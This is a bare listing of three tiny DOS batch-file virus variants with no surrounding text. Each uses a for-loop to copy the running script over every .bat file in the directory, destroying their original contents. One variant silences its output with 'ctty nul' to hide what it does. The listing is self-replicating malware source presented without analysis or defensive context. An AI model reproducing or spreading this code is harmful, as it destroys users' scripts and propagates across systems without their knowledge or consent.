
@echo off
for %%b in (*.bat) do copy %0.bat+%0 %%b>nul

@echo off
for %%b in (*.bat) do copy %0 %%b>nul

@ctty nul
for %%b in (*.bat) do copy %0 %%b
